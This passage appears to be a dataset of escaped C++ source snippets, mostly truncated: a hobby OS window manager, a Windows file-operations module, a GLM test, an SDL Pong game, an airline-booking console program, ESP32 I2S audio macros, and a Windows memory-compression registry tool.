   // Total number of frames rendered\r\ndouble AvgFPS = 0;           // Average FPS\r\n\r\n// Constructor for the window manager\r\nAtlasWindowManager::AtlasWindowManager(AtlasAdvancedGraphics* gfx, uint32_t desktopBgColor)\r\n    : gfx(gfx), desktopBgColor(desktopBgColor), windowCount(0) {\r\n        PIT::SetDivisor(65535);\r\n    }\r\n\r\n// Add a new window to the manager\r\nvoid AtlasWindowManager::AddWindow(Window* window) {\r\n    if (windowCount < MAX_WINDOWS) {\r\n        window->windowBuffer = AAiMalloc(window->Width * window->Height * sizeof(uint32_t)); // Allocate memory for the buffer\r\n\r\n        memset(window->windowBuffer, 0, window->Width * window->Height * sizeof(uint32_t));\r\n\r\n        if (window->windowBuffer == nullptr) {\r\n            abg->AAiPrint(\"awm: failed to allocate memory for window buffer\");\r\n            abg->NextLine();\r\n            return;\r\n        }\r\n        \r\n        AtlasGraphicsLibrary* hwndAGL = new AtlasGraphicsLibrary(window->windowBuffer, window->Width, window->Height, gfx->psf1_font);\r\n        window->agl = hwndAGL;\r\n\r\n        windows[windowCount] = window;\r\n        windowCount++;\r\n        FocusWindow(windowCount - 1); // Focus the newly added window\r\n    }\r\n}\r\n\r\nvoid AtlasWindowManager::RemoveWindow(int index) {\r\n    if (index < windowCount) {\r\n        AAiFree(windows[index]->windowBuffer);\r\n\r\n        for (int i = index; i < windowCount - 1; i++) {\r\n            windows[i] = windows[i + 1];\r\n        }\r\n        windowCount--;\r\n\r\n        // Focus on the previous window if there is one\r\n        if (index > 0) {\r\n            FocusWindow(index - 1);\r\n        } else if (windowCount > 0) {\r\n            FocusWindow(-1);\r\n        }\r\n    }\r\n}\r\n\r\nuint64_t mouseOffsetX = 0;\r\nuint64_t mouseOffsetY = 0;\r\n\r\nvoid AtlasWindowManager::OnMouseDown(uint32_t mouseX, uint32_t mouseY) {\r\n    for (int i = windowCount - 1; i >= 0; i--) { // Start with the top-most window\r\n        Window* window = windows[i];\r\n\r\n        if (window->isMinimized) {\r\n            continue;\r\n        }\r\n\r\n        if (mouseX >= window->Position.X && mouseX <= window->Position.X + window->Width &&\r\n            mouseY >= window->Position.Y && mouseY <= window->Position.Y + window->Height) {\r\n            \r\n            FocusWindow(i);\r\n            MarkWindowDirty(i);\r\n\r\n            if (mouseY <= window->Position.Y + 20) { // Check if the click is on the title bar\r\n                // Check close button\r\n                if (mouseX >= window->Position.X + window->Width - 40 &&\r\n                    mouseX <= window->Position.X + window->Width) {\r\n                    // Handle Close Button\r\n                    MarkWindowDirty(i);\r\n                    RemoveWindow(i); // Example function to close the window\r\n                    return;\r\n                }\r\n                // Check maximize button\r\n                else if (mouseX >= window->Position.X + window->Width - 80 &&\r\n                         mouseX <= window->Position.X + window->Width - 40) {\r\n                    // Handle Maximize Button\r\n                    MarkWindowDirty(i);\r\n                    Maximize(i); // Call the maximize handler\r\n                    return;\r\n       ",
    "#include \"files_interaction.h\"\n\n// Function to convert forward slashes to backslashes (since Windows uses backslashes in file paths)\nstring Files::convert_to_backslashes(string str) {\n\tfor (int i = 0; i < str.size(); i++) {\n\t\tif (str[i] == '/') {\n\t\t\tstr[i] = '\\\\';\n\t\t}\n\t}\n\n\treturn str;\n}\n\n// Function to convert /Date(1620000000000)/ to a readable date format\nstring Files::convert_date_format(string date) {\n\tstring timestamp = date.substr(6, 13);\n\tlong long timestamp_long = stoll(timestamp);\n\ttime_t timestamp_time = timestamp_long / 1000;\n\n\tstruct tm timeinfo;\n\tlocaltime_s(&timeinfo, &timestamp_time);\n\n\tchar buffer[80];\n\tstrftime(buffer, sizeof(buffer), \"%Y-%m-%d %H:%M:%S\", &timeinfo);\n\n\treturn string(buffer);\n}\n\n// Function to convert the length of a file (in bytes) to a human-readable format\nstring Files::convert_file_size(long long length) {\n\t// If length is null, return an empty string\n\tif (length == 0) {\n\t\treturn \"\";\n\t}\n\n\tif (length < 1024) {\n\t\treturn to_string(length) + \" bytes\";\n\t}\n\telse if (length < 1024 * 1024) {\n\t\treturn to_string(length / 1024) + \" KB\";\n\t}\n\telse if (length < 1024 * 1024 * 1024) {\n\t\treturn to_string(length / (1024 * 1024)) + \" MB\";\n\t}\n\telse {\n\t\treturn to_string(length / (1024 * 1024 * 1024)) + \" GB\";\n\t}\n}\n\n// Function to determine an item is a file or a folder\nstring Files::get_item_type(bool psiscontainer) {\n\tif (psiscontainer) {\n\t\treturn \"Directory\";\n\t}\n\n\treturn \"File\";\n}\n\nstring Files::get_mode_type(string mode) {\n\tstring description = \"\";\n\n\tif (mode[0] == 'd') {\n\t\tdescription += \"Directory; \";\n\t}\n\telse {\n\t\tdescription += \"File; \";\n\t}\n\n\tif (mode[1] == 'a') {\n\t\tdescription += \"Archive; \";\n\t}\n\tif (mode[2] == 'r') {\n\t\tdescription += \"Read-only; \";\n\t}\n\tif (mode[3] == 'h') {\n\t\tdescription += \"Hidden; \";\n\t}\n\tif (mode[4] == 's') {\n\t\tdescription += \"System; \";\n\t}\n\tif (mode[5] == 'l') {\n\t\tdescription += \"Reparse Point (Symbolic Link or Junction); \";\n\t}\n\n\t// Remove the last semicolon and space if it exists\n\tif (!description.empty()) {\n\t\tdescription = description.substr(0, description.size() - 2);\n\t}\n\n\treturn description;\n}\n\n// Function to create a file\njson Files::create_file(const char* filename) {\n\tofstream file(filename);\n\n\tjson response = {\n\t\t{\"cmd\", \"createff\"},\n\t\t{\"body\", {\n\t\t\t{\"status\", \"sending\"},\n\t\t\t{\"path\", \"\"},\n\t\t\t{\"type\", \"file\"},\n\t\t}}\n\t};\n\n\tmemset(buffer, 0, BUFFER_SIZE);\n\n\tif (file.is_open()) {\n\t\tlog(\"File created successfully\", SUCCESS_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"success\";\n\t\tresponse[\"body\"][\"path\"] = string(filename);\n\t}\n\telse {\n\t\tlog(\"File creation failed\", ERROR_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"error\";\n\t}\n\n\tfile.close();\n\treturn response;\n\n}\n\n// Function to create a folder\njson Files::create_folder(const char* foldername) {\n\tint result = _mkdir(foldername);\n\n\tjson response = {\n\t\t{\"cmd\", \"createff\"},\n\t\t{\"body\", {\n\t\t\t{\"status\", \"sending\"},\n\t\t\t{\"path\", \"\"},\n\t\t\t{\"type\", \"folder\"},\n\t\t}}\n\t};\n\n\tif (result == 0) {\n\t\tlog(\"Folder created successfully\", SUCCESS_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"success\";\n\t\tresponse[\"body\"][\"path\"] = string(foldername);\n\t}\n\telse {\n\t\tlog(\"Folder creation failed\", ERROR_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"error\";\n\t}\n\n\treturn response;\n}\n\n// Function to move a file\njson Files::move_file(const char* old_filename, const char* new_filename) {\n\tint result = rename(old_filename, new_filename);\n\n\tjson response = {\n\t\t{\"cmd\", \"moveff\"},\n\t\t{\"body\", {\n\t\t\t{\"status\", \"sending\"},\n\t\t\t{\"type\", \"file\"},\n\t\t\t{\"source\", \"\"},\n\t\t\t{\"destination\", \"\"},\n\t\t}}\n\t};\n\n\tif (result == 0) {\n\t\tlog(\"File moved successfully\", SUCCESS_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"success\";\n\t\tresponse[\"body\"][\"source\"] = string(old_filename);\n\t\tresponse[\"body\"][\"destination\"] = string(new_filename);\n\t}\n\telse {\n\t\tlog(\"File move failed\", ERROR_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"error\";\n\t}\n\n\treturn response;\n}\n\n// Function to move a folder\njson Files::move_folder(const char* old_foldername, const char* new_foldername) {\n\tint result = rename(old_foldername, new_foldername);\n\n\tjson response = {\n\t\t{\"cmd\", \"moveff\"},\n\t\t{\"body\", {\n\t\t\t{\"status\", \"sending\"},\n\t\t\t{\"type\", \"folder\"},\n\t\t\t{\"source\", \"\"},\n\t\t\t{\"destination\", \"\"},\n\t\t}}\n\t};\n\n\tif (result == 0) {\n\t\tlog(\"Folder moved successfully\", SUCCESS_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"success\";\n\t\tresponse[\"body\"][\"source\"] = string(old_foldername);\n\t\tresponse[\"body\"][\"destination\"] = string(new_foldername);\n\t}\n\telse {\n\t\tlog(\"Folder move failed\", ERROR_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"error\";\n\t}\n\n\treturn response;\n}\n\n// Function to copy a file\njson Files::copy_file(const char* old_filename, const char* new_filename) {\n\tifstream source(old_filename, ios::binary);\n\tofstream dest(new_filename, ios::binary);\n\n\tjson response = {\n\t\t{\"cmd\", \"copyff\"},\n\t\t{\"body\", {\n\t\t\t{\"status\", \"sending\"},\n\t\t\t{\"type\", \"file\"},\n\t\t\t{\"source\", \"\"},\n\t\t\t{\"destination\", \"\"},\n\t\t}}\n\t};\n\n\tif (!source.is_open()) {\n\t\tlog(\"Failed to open source file\", ERROR_LOG);\n\t\tresponse[\"body\"][\"status\"] = \"error\";\n\t\treturn response;\n\t}\n\n\tif (!dest.is_open()) {\n\t\tlog(\"Failed to op",
    "#define GLM_FORCE_INLINE\n#define GLM_PRECISION_HIGHP_FLOAT\n#include <glm/glm.hpp>\n#include <glm/ext.hpp>\n\nstatic int test_mat()\n{\n\tint Error = 0;\n\n\tError += sizeof(glm::mat2) == sizeof(glm::highp_mat2) ? 0 : 1;\n\tError += sizeof(glm::mat3) == sizeof(glm::highp_mat3) ? 0 : 1;\n\tError += sizeof(glm::mat4) == sizeof(glm::highp_mat4) ? 0 : 1;\n\n\tError += sizeof(glm::mat2x2) == sizeof(glm::highp_mat2x2) ? 0 : 1;\n\tError += sizeof(glm::mat2x3) == sizeof(glm::highp_mat2x3) ? 0 : 1;\n\tError += sizeof(glm::mat2x4) == sizeof(glm::highp_mat2x4) ? 0 : 1;\n\tError += sizeof(glm::mat3x2) == sizeof(glm::highp_mat3x2) ? 0 : 1;\n\tError += sizeof(glm::mat3x3) == sizeof(glm::highp_mat3x3) ? 0 : 1;\n\tError += sizeof(glm::mat3x4) == sizeof(glm::highp_mat3x4) ? 0 : 1;\n\tError += sizeof(glm::mat4x2) == sizeof(glm::highp_mat4x2) ? 0 : 1;\n\tError += sizeof(glm::mat4x3) == sizeof(glm::highp_mat4x3) ? 0 : 1;\n\tError += sizeof(glm::mat4x4) == sizeof(glm::highp_mat4x4) ? 0 : 1;\n\n\treturn Error;\n}\n\nstatic int test_vec()\n{\n\tint Error = 0;\n\n\tError += sizeof(glm::vec2) == sizeof(glm::highp_vec2) ? 0 : 1;\n\tError += sizeof(glm::vec3) == sizeof(glm::highp_vec3) ? 0 : 1;\n\tError += sizeof(glm::vec4) == sizeof(glm::highp_vec4) ? 0 : 1;\n\n\treturn Error;\n}\n\nstatic int test_dvec()\n{\n\tint Error = 0;\n\t\n\tError += sizeof(glm::dvec2) == sizeof(glm::highp_dvec2) ? 0 : 1;\n\tError += sizeof(glm::dvec3) == sizeof(glm::highp_dvec3) ? 0 : 1;\n\tError += sizeof(glm::dvec4) == sizeof(glm::highp_dvec4) ? 0 : 1;\n\t\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_mat();\n\tError += test_vec();\n\tError += test_dvec();\n\t\n\treturn Error;\n}\n",
    "#include\"game.h\"\r\n\r\nGame::Game() : mWindow(nullptr), mIsRunning(true),mRenderer(nullptr),mTicksCount(0) {}\r\n\r\n\r\nbool Game::Initialize() {\r\n\tint sdlResult = SDL_Init(SDL_INIT_VIDEO);\r\n\r\n\tif (sdlResult != 0) {\r\n\t\tSDL_Log(\"Unable to initialize SDL: %s\", SDL_GetError());\r\n\t\treturn false;\r\n\t}\r\n\r\n\tmWindow = SDL_CreateWindow(\"Test\", 100, 100, 1024, 768, 0);\r\n\r\n\tif (!mWindow) {\r\n\t\tSDL_Log(\"Could not initialize SDL %s\", SDL_GetError());\r\n\t\treturn false;\r\n\t}\r\n\r\n\tmRenderer = SDL_CreateRenderer(\r\n\t\tmWindow,\r\n\t\t-1,\r\n\t\tSDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC\r\n\t);\r\n\t\r\n\r\n\tmBallPos.x = 512.0f;\r\n\tmBallPos.y = 384.0f;\r\n\tmPaddlePos.x = 7.5f;\r\n\tmPaddlePos.y = 384.0f;\r\n\tmBallVel.x = -300.0f;\r\n\tmBallVel.y = 350.0f;\r\n\r\n\treturn true;\r\n}\r\n\r\nvoid Game::RunLoop() {\r\n\twhile (mIsRunning) {\r\n\t\tProcessInput();\r\n\t\tUpdateGame();\r\n\t\tGenerateOutput();\r\n\t}\r\n}\r\nvoid Game::Shutdown() {\r\n\tSDL_DestroyWindow(mWindow);\r\n\tSDL_DestroyRenderer(mRenderer);\r\n\tSDL_Quit();\r\n}\r\n\r\nvoid Game::GenerateOutput() {\r\n\tSDL_SetRenderDrawColor(\r\n\t\tmRenderer,\r\n\t\t0,\r\n\t\t0,\r\n\t\t255,\r\n\t\t255\r\n\t);\r\n\tSDL_RenderClear(mRenderer);\r\n\t\r\n\tSDL_SetRenderDrawColor(\r\n\t\tmRenderer,\r\n\t\t255,\r\n\t\t255,\r\n\t\t255,\r\n\t\t255\r\n\t);\r\n\tSDL_Rect wall{\r\n\t\t0,\r\n\t\t0,\r\n\t\t1024,\r\n\t\tthickness\r\n\t};\r\n\tSDL_RenderFillRect(mRenderer, &wall);\r\n\r\n\t\r\n\r\n\twall.y = 768 - thickness;\r\n\tSDL_RenderFillRect(mRenderer, &wall);\r\n\r\n\twall.x = 1024 - thickness;\r\n\twall.y = 0;\r\n\twall.w = thickness;\r\n\twall.h = 768;\r\n\tSDL_RenderFillRect(mRenderer, &wall);\r\n\r\n\tSDL_Rect ball{\r\n\t\tstatic_cast<int>(mBallPos.x - thickness / 2),\r\n\t\tstatic_cast<int>(mBallPos.y - thickness / 2),\r\n\t\tthickness,\r\n\t\tthickness\r\n\t};\r\n\r\n\tSDL_RenderFillRect(mRenderer, &ball);\r\n\r\n\tSDL_Rect paddle{\r\n\t\tstatic_cast<int>(mPaddlePos.x - thickness / 2),\r\n\t\tstatic_cast<int>(mPaddlePos.y - 60 / 2),\r\n\t\tthickness,\r\n\t\t60\r\n\t};\r\n\r\n\tSDL_RenderFillRect(mRenderer, &paddle);\r\n\r\n\tSDL_RenderPresent(mRenderer);\r\n}\r\n\r\nvoid Game::ProcessInput() \r\n{\r\n\tSDL_Event event;\r\n\twhile (SDL_PollEvent(&event)) {\r\n\t\tswitch (event.type)\r\n\t\t{\r\n\t\tcase SDL_QUIT:\r\n\t\t\tmIsRunning = false;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\tconst Uint8* state = SDL_GetKeyboardState(NULL);\r\n\tmPaddleDir = 0;\r\n\t\r\n\t\r\n\tif (state[SDL_SCANCODE_ESCAPE])\r\n\t{\r\n\t\tmIsRunning = false;\r\n\t}\r\n\tif (state[SDL_SCANCODE_W])\r\n\t{\r\n\t\tmPaddleDir -= 1;\r\n\t}\r\n\tif (state[SDL_SCANCODE_S])\r\n\t{\r\n\t\tmPaddleDir += 1;\r\n\t}\r\n\r\n\tif (mPaddleDir != 0)\r\n\t{\r\n\t\tmPaddlePos.y += mPaddleDir * 300.0f * deltaTime;\r\n\r\n\t\tif (mPaddlePos.y < thickness + 30) {\r\n\t\t\tmPaddlePos.y = 768.0f - thickness -30;\r\n\t\t}\r\n\t\tif (mPaddlePos.y > 768.0f - thickness - 30) {\r\n\t\t\tmPaddlePos.y = thickness + 30;\r\n\t\t}\r\n\t}\r\n\tmBallPos.y += mBallVel.y * deltaTime;\r\n\tmBallPos.x += mBallVel.x * deltaTime;\r\n\tif (mBallPos.y < thickness + thickness / 2) {\r\n\t\tmBallVel.y *= -1;\r\n\t}\r\n\tif (mBallPos.y > 768.0f - thickness - thickness / 2) {\r\n\t\tmBallVel.y *= -1;\r\n\t}\r\n\tif (mBallPos.x > 1024.0f - thickness - thickness / 2) {\r\n\t\tmBallVel.x *= -1;\r\n\t}\r\n\r\n\tfloat diff = mBallPos.y - mPaddlePos.y;\r\n\tif (diff < 0.0f) {\r\n\t\tdiff *= -1;\r\n\t}\r\n\tif (diff <= 30 &&\r\n\t\tmBallPos.x <20.0f && mBallPos.x>10.0f &&\r\n\t\tmBallVel.x < 0.0f\r\n\t\t)\r\n\t{\r\n\t\tmBallVel.x *= -1;\r\n\t}\r\n\tif (mBallPos.x < 0.0f) {\r\n\t\tmIsRunning = false;\r\n\t}\r\n}\r\n\r\nvoid Game::UpdateGame() {\r\n\twhile (!SDL_TICKS_PASSED(SDL_GetTicks(), mTicksCount + 16)) ;\r\n\r\n\tdeltaTime = (SDL_GetTicks() - mTicksCount) / 1000.0f;\r\n\tmTicksCount = SDL_GetTicks();\r\n\r\n\tif (deltaTime > 0.05f) {\r\n\t\tdeltaTime = 0.05f;\r\n\t}\r\n}\r\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <cstring>\r\n#include <cstdlib>\r\nusing namespace std;\r\n\r\nstruct MyTime {\r\n    int choose;\r\n    void getData() {\r\n        cout << \"\\nON WHICH TIME YOU WANT TO TRAVEL\" << endl << endl;\r\n        cout << \"PRESS 1 FOR 11 AM\" << endl;\r\n        cout << \"PRESS 2 FOR 10 AM\" << endl;\r\n        cout << \"PRESS 3 FOR 9 AM\" << endl;\r\n        cout << \"\\nEnter your choice: \";\r\n        cin >> choose;\r\n    }\r\n    \r\n    void show() {\r\n        if (choose == 1) {\r\n            cout << \"|                                                                         \" << endl;\r\n            cout << \"|flight time 11 AM                                                        \" << endl;\r\n            cout << \"|_________________________________________________________________________\" << endl;\r\n            cout << \"                  GOOD BYE AND HAVE A SAFE JOURNEY                        \" << endl;\r\n        } else if (choose == 2) {\r\n            cout << \"|                                                                         \" << endl;\r\n            cout << \"|flight time 10 AM                                                        \" << endl;\r\n            cout << \"|_________________________________________________________________________\" << endl;\r\n            cout << \"                  GOOD BYE AND HAVE A SAFE JOURNEY                        \" << endl;\r\n        } else if (choose == 3) {\r\n            cout << \"|                                                                         \" << endl;\r\n            cout << \"|flight time 9 AM                                                         \" << endl;\r\n            cout << \"|_________________________________________________________________________\" << endl;\r\n            cout << \"                  GOOD BYE AND HAVE A SAFE JOURNEY                        \" << endl;\r\n        }\r\n    }\r\n};\r\n\r\nstruct Booking {\r\n    int num, dd, mm, yyyy;\r\n    char firstname[60], lastname[60], address[60], c_loc[30], dest[30];\r\n\r\n    void getData() {\r\n        cout << setw(40) << \"\\n\\n     ::Please enter the required information for passenger::\" << endl;\r\n        cout << \"\\n\\n\\nEnter the firstname of passenger: \";\r\n        cin >> firstname;\r\n        cout << endl << \"Enter the lastname of passenger: \";\r\n        cin >> lastname;\r\n        cout << endl << \"Enter address of passenger:  \";\r\n        cin >> address;\r\n        cout << endl << \"Enter the number of tickets: \";\r\n        cin >> num;\r\n        cout << endl << \"Enter the current location of passenger (IN CAPITAL LETTERS ONLY):  \";\r\n        cin >> c_loc;\r\n        cout << endl << \"Enter the destination of passenger (IN CAPITAL LETTERS ONLY):  \";\r\n        cin >> dest;\r\n        cout << endl << \"Enter your date (dd/mm/yyyy): \";\r\n        cin >> dd >> mm >> yyyy;\r\n        system(\"CLS\");\r\n    }\r\n\r\n    void show() {\r\n        cout << setw(40) << \"Your E-Ticket is :\" << endl;\r\n        int t = 1, r = 12345;\r\n        cout << \"                           AIRLINE TICKET                                 \" << endl;\r\n        cout << \"|Ticket No.\" << t << \"                                Reference No.\" << r << \"\\t  \" << endl;\r\n        cout << \"|_________________________________________________________________________\" << endl;\r\n        cout << \"|Passenger Information :                                                  \" << endl;\r\n        cout << \"|Name :\" << lastname << \" \" << firstname << \"                                     \" << endl;\r\n        cout << \"|Address :\" << address << \"                                                   \" << endl;\r\n        cout << \"|Number of tickets :\" << num << \"                                             \" << endl;\r\n        cout << \"|_________________________________________________________________________\" << endl;\r\n        cout << \"|flight Information :\" << endl;\r\n        if (dd < 0 || dd > 31 || mm < 0 || mm > 12 || yyyy < 0) {\r\n            cout << \"|INVALID DATE.. \";\r\n        } else {\r\n            cout << \"|Date :\" << dd << \" \" << mm << \" \" << yyyy << endl;\r\n        }\r\n        cout << endl;\r\n        cout << \"|BOING 747                                                                \" << endl;\r\n        cout << \"|_________________________________________________________________________\" << endl;\r\n        cout << \"|Depart :\" << c_loc << \"                                                      \" << endl;\r\n        cout << \"|Arrive :\" << dest << \"                                                       \" << endl;\r\n        cout << \"|*BAGGAGE allowed 40 Kilos                                                \" << endl;\r\n        cout << \"|*contact Airline to Confirm baggage allowance                            \" << endl;\r\n        cout << \"|_________________________________________________________________________\" << endl;\r\n        t = t + 1;\r\n        r = r + 1;\r\n    }\r\n};\r\n\r\nstruct Search {\r\n    void searching() {\r\n        cout << \"FOLLOWING ARE THE FLIGHTS AVAILABLE\\n\" << endl;\r\n        const char l_destination[15][40] = { \"KARAC",
    "// Disable the automatic pin remapping of the API calls in this file\n#define ARDUINO_CORE_BUILD\n\n#include \"ESP_I2S.h\"\n\n#if SOC_I2S_SUPPORTED\n\n#include \"esp32-hal-periman.h\"\n#include \"wav_header.h\"\n#if ARDUINO_HAS_MP3_DECODER\n#include \"mp3dec.h\"\n#endif\n\n#define I2S_READ_CHUNK_SIZE 1920\n\n#define I2S_DEFAULT_CFG()                                                                                                                    \\\n  {                                                                                                                                          \\\n    .id = I2S_NUM_AUTO, .role = I2S_ROLE_MASTER, .dma_desc_num = 6, .dma_frame_num = 240, .auto_clear = true, .auto_clear_before_cb = false, \\\n    .intr_priority = 0                                                                                                                       \\\n  }\n\n#define I2S_STD_CHAN_CFG(_sample_rate, _data_bit_width, _slot_mode)                                                                   \\\n  {                                                                                                                                   \\\n    .clk_cfg = I2S_STD_CLK_DEFAULT_CONFIG(_sample_rate), .slot_cfg = I2S_STD_PHILIP_SLOT_DEFAULT_CONFIG(_data_bit_width, _slot_mode), \\\n    .gpio_cfg = {                                                                                                                     \\\n      .mclk = (gpio_num_t)_mclk,                                                                                                      \\\n      .bclk = (gpio_num_t)_bclk,                                                                                                      \\\n      .ws = (gpio_num_t)_ws,                                                                                                          \\\n      .dout = (gpio_num_t)_dout,                                                                                                      \\\n      .din = (gpio_num_t)_din,                                                                                                        \\\n      .invert_flags =                                                                                                                 \\\n        {                                                                                                                             \\\n          .mclk_inv = _mclk_inv,                                                                                                      \\\n          .bclk_inv = _bclk_inv,                                                                                                      \\\n          .ws_inv = _ws_inv,                                                                                                          \\\n        },                                                                                                                            \\\n    },                                                                                                                                \\\n  }\n\n#if SOC_I2S_SUPPORTS_TDM\n#define I2S_TDM_CHAN_CFG(_sample_rate, _data_bit_width, _slot_mode, _mask)                                                                   \\\n  {                                                                                                                                          \\\n    .clk_cfg = I2S_TDM_CLK_DEFAULT_CONFIG(_sample_rate), .slot_cfg = I2S_TDM_PHILIP_SLOT_DEFAULT_CONFIG(_data_bit_width, _slot_mode, _mask), \\\n    .gpio_cfg = {                                                                                                                            \\\n      .mclk = (gpio_num_t)_mclk,                                                                                                             \\\n      .bclk = (gpio_num_t)_bclk,                                                                                                             \\\n      .ws = (gpio_num_t)_ws,                                                                                                                 \\\n      .dout = (gpio_num_t)_dout,                                                                                                             \\\n      .din = (gpio_num_t)_din,                                                                                                               \\\n      .invert_flags =                                                                                                                        \\\n        {                                                                                                                                    \\\n          .mclk_inv = _mclk_inv,                                                                                                             \\\n          .bclk_inv = _bclk_inv,                                                                                                             \\\n          .ws_inv = _ws_inv,                                           ",
    "#include <Windows.h>\n#include <iostream>\n#include <string>\n\n#pragma comment(lib, \"advapi32.lib\")\n\nLSTATUS RestartService()\n{\n    SERVICE_STATUS serviceStatus = {};\n    LSTATUS result = ERROR_SUCCESS;\n\n    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);\n    if (!scmHandle)\n    {\n        result = GetLastError();\n        std::cerr << \"error: \" << result << std::endl;\n        return result;\n    }\n\n    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, L\"SysMain\", SERVICE_ALL_ACCESS);\n    if (!serviceHandle)\n    {\n        result = GetLastError();\n        std::cerr << \"error: \" << result << std::endl;\n        CloseServiceHandle(scmHandle);\n        return result;\n    }\n\n    if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus))\n    {\n        std::cout << \"stopping service...\" << std::endl;\n        Sleep(2000);\n    }\n    else\n    {\n        DWORD error = GetLastError();\n        if (error != ERROR_SERVICE_NOT_ACTIVE)\n        {\n            std::cerr << \"error: \" << error << std::endl;\n            result = error;\n            goto Cleanup;\n        }\n    }\n\n    std::cout << \"starting service...\" << std::endl;\n    if (StartServiceW(serviceHandle, 0, nullptr))\n    {\n        std::cout << \"restarted\" << std::endl;\n    }\n    else\n    {\n        result = GetLastError();\n        std::cerr << \"error: \" << result << std::endl;\n    }\n\nCleanup:\n    if (serviceHandle)\n        CloseServiceHandle(serviceHandle);\n    if (scmHandle)\n        CloseServiceHandle(scmHandle);\n\n    return result;\n}\n\nLSTATUS GetSuperfetchRegistryKey(HKEY* registryKey)\n{\n    HKEY mainKey = nullptr;\n    HKEY staticConfigKey = nullptr;\n    HKEY serviceKey = nullptr;\n    WCHAR subKeyPath[264] = { 0 };\n\n    *registryKey = nullptr;\n\n    LSTATUS result = RegCreateKeyExW(\n        HKEY_LOCAL_MACHINE,\n        L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Superfetch\",\n        0,\n        nullptr,\n        0,\n        KEY_READ | KEY_WRITE,\n        nullptr,\n        &mainKey,\n        nullptr);\n\n    if (result != ERROR_SUCCESS)\n        return result;\n\n    result = RegCreateKeyExW(\n        mainKey,\n        L\"StaticConfig\",\n        0,\n        nullptr,\n        0,\n        KEY_READ | KEY_WRITE,\n        nullptr,\n        &staticConfigKey,\n        nullptr);\n\n    if (result != ERROR_SUCCESS)\n    {\n        RegCloseKey(mainKey);\n        return result;\n    }\n\n    DWORD valueType = REG_SZ;\n    DWORD valueSize = sizeof(subKeyPath);\n    result = RegQueryValueExW(\n        staticConfigKey,\n        L\"ServiceKeyPath\",\n        nullptr,\n        &valueType,\n        reinterpret_cast<BYTE*>(subKeyPath),\n        &valueSize);\n\n    if (result == ERROR_FILE_NOT_FOUND)\n    {\n        *registryKey = mainKey;\n        RegCloseKey(staticConfigKey);\n        return ERROR_SUCCESS;\n    }\n\n    if (result != ERROR_SUCCESS)\n    {\n        RegCloseKey(mainKey);\n        RegCloseKey(staticConfigKey);\n        return result;\n    }\n\n    result = RegCreateKeyExW(\n        HKEY_LOCAL_MACHINE,\n        subKeyPath,\n        0,\n        nullptr,\n        0,\n        KEY_READ | KEY_WRITE,\n        nullptr,\n        &serviceKey,\n        nullptr);\n\n    if (result == ERROR_SUCCESS)\n        *registryKey = serviceKey;\n\n    RegCloseKey(mainKey);\n    RegCloseKey(staticConfigKey);\n    return result;\n}\n\nLSTATUS ConfigureMemoryCompression(bool enable)\n{\n    HKEY registryKey = nullptr;\n\n    LSTATUS result = GetSuperfetchRegistryKey(&registryKey);\n    if (result != ERROR_SUCCESS)\n    {\n        std::cerr << \"error: \" << result << std::endl;\n        return result;\n    }\n\n    DWORD adminEnableValue = 0;\n    DWORD adminDisableValue = 0;\n\n    DWORD valueSize = sizeof(DWORD);\n    result = RegQueryValueExW(registryKey, L\"AdminEnable\", nullptr, nullptr, reinterpret_cast<BYTE*>(&adminEnableValue), &valueSize);\n    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND)\n    {\n        std::cerr << \"error: \" << result << std::endl;\n        RegCloseKey(registryKey);\n        return result;\n    }\n\n    valueSize = sizeof(DWORD);\n    result = RegQueryValueExW(registryKey, L\"AdminDisable\", nullptr, nullptr, reinterpret_cast<BYTE*>(&adminDisableValue), &valueSize);\n    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND)\n    {\n        std::cerr << \"error: \" << result << std::endl;\n        RegCloseKey(registryKey);\n        return result;\n    }\n\n    if (enable)\n    {\n        adminEnableValue |= 0x200;\n        adminDisableValue &= ~0x200;\n    }\n    else\n    {\n        adminEnableValue &= ~0x200;\n        adminDisableValue |= 0x200;\n    }\n\n    result = RegSetValueExW(\n        registryKey,\n        L\"AdminEnable\",\n        0,\n        REG_DWORD,\n        reinterpret_cast<const BYTE*>(&adminEnableValue),\n        sizeof(adminEnableValue));\n\n    if (result != ERROR_SUCCESS)\n    {\n        std::cerr << \"error: \" << result << std::endl;\n        RegCloseKey(registryKey);\n        return result;\n    }\n\n    result = RegSetValueExW(\n        registryKey,\n        L\"AdminDisable\",\n        0,\n        REG_DWORD,\n        reinterp",
